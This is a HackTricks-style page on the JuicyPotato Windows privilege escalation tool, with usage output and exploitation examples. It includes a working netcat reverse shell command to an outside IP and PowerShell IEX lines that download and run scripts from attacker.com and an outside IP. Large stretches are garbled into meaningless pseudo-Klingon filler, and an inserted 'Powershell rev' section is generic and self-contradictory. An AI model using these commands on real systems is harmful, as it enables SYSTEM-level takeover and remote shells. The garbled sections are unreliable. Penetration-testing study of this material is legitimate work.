# JuicyPotato

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. _**Check:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (abusing the golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Summary <a href="#summary" id="summary"></a>

**[From juicy-potato Readme](https://github.com/ohpe/juicy-potato/blob/master/README.md):**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

We decided to weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Say hello to Juicy Potato**.

> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.

We discovered that, other than `BITS` there are a several COM servers we can abuse. They just need to:

1. be instantiable by the current user, normally a “service user” which has impersonation privileges
2. implement the `IMarshal` interface
3. run as an elevated user (SYSTEM, Administrator, …)

After some testing we obtained and tested an extensive list of [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) on several Windows versions.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato allows you to:

* **Target CLSID** _pick any CLSID you want._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _you can find the list organized by OS._
* **COM Listening port** _define COM listening port you prefer (instead of the marshalled hardcoded 6666)_
* **COM Listening IP address** _bind the server on any IP_
* **Process creation mode** _depending on the impersonated user’s privileges you can choose from:_
* `CreateProcessWithToken` (needs `SeImpersonate`)
* `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
* `both`
* **Process to launch** _launch an executable or script if the exploitation succeeds_
* **Process Argument** _customize the launched process arguments_
* **RPC Server address** _for a stealthy approach you can authenticate to an external RPC server_
* **RPC Server port** _useful if you want to authenticate to an external server and firewall is blocking port `135`…_
* **TEST mode** _mainly for testing purposes, i.e. testing CLSIDs. It creates the DCOM and prints the user of token. See_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Qapla' <a href="#final-thoughts" id="final-thoughts"></a>

**[juicy-potato Readme](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts) vItlhutlh:** 

vaj SeImpersonate je SeAssignPrimaryToken privileges 'oH vItlhutlh **SYSTEM**.

vaj COM Servers vItlhutlh abuse vItlhutlh. vaj permissions vItlhutlh modifying objects 'ej 'ej 'oH DCOMCNFG vItlhutlh, 'oH vItlhutlh challenging.

vItlhutlh accounts 'ej applications 'ej protect sensitive run 'ej `* SERVICE` accounts. 'oH DCOM vItlhutlh exploit 'ach vItlhutlh impact underlying OS.

vaj: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Examples

Note: [this page](https://ohpe.it/juicy-potato/CLSID/) vItlhutlh list CLSIDs try.

### Get a nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev

#### Description

The `Powershell rev` technique is a method used to achieve local privilege escalation on Windows systems. It involves leveraging the `Powershell` scripting language to execute arbitrary commands with elevated privileges.

#### Method

1. Open a `Powershell` session with administrative privileges.

2. Use the `Invoke-Expression` cmdlet to execute the following command:

   ```powershell
   Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/malicious.ps1')"
   ```

   This command downloads a malicious `PowerShell` script from the specified URL and executes it.

3. The downloaded script can contain any arbitrary commands that the attacker wants to execute with elevated privileges. For example, it can include commands to create a new user account, modify system settings, or install a backdoor.

4. After executing the `Powershell rev` technique, the attacker will have escalated privileges on the compromised Windows system.

#### Mitigation

To mitigate the risk of the `Powershell rev` technique, follow these recommendations:

- Regularly update and patch your Windows systems to ensure that known vulnerabilities are addressed.

- Implement strong access controls and restrict administrative privileges to only trusted users.

- Use application whitelisting to prevent the execution of unauthorized scripts or binaries.

- Monitor and analyze network traffic for suspicious activity, such as connections to malicious URLs.

- Educate users about the risks of downloading and executing scripts from untrusted sources.

By following these best practices, you can reduce the likelihood of successful local privilege escalation attacks using the `Powershell rev` technique.
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### **CMD vItlhutlh** (RDP qur)

![](<../../.gitbook/assets/image (37).png>)

## CLSID vItlhutlh

QaStaHvIS, JuicyPotato **QaStaHvIS** CLSID **QaStaHvIS** **pagh**. QaStaHvIS, **QaStaHvIS CLSID** **QaStaHvIS** **vItlhutlh**. **QaStaHvIS** **operating system** **CLSIDs** **vItlhutlh** **ghItlh**:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **CLSIDs** **chaw'}

QaStaHvIS, juicypotato.exe **QaStaHvIS** **executables** **QaStaHvIS** **QaStaHvIS**.

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) **Download** **PS session** **vItlhutlh**, [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) **Download** **QaStaHvIS** **execute**. **QaStaHvIS** **script** **CLSIDs** **list** **vItlhutlh**.

**test\_clsid.bat** **Download** (CLSID **list** **juicypotato executable** **ghItlh** **path**) **QaStaHvIS** **execute**. **QaStaHvIS** **CLSID** **QaStaHvIS**, **'ej** **port number** **vItlhutlh**, **CLSID** **QaStaHvIS**.

**-c** **parameter** **vItlhutlh** **working CLSIDs** **Check**

## References
* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>tlhInganpu' (AWS hacking) vItlhutlh</strong></a><strong>!</strong></summary>

* **cybersecurity company** **Do you work**? **HackTricks** **company** **advertised** **want**? **PEASS** **latest version** **HackTricks** **download** **want**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **Check**!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **Discover**, [**NFTs**](https://opensea.io/collection/the-peass-family) **collection** **exclusive** **our**
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **Get**
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) **telegram group** **the** [**follow**](https://t.me/peass) **me** **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **hacktricks-cloud repo** **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
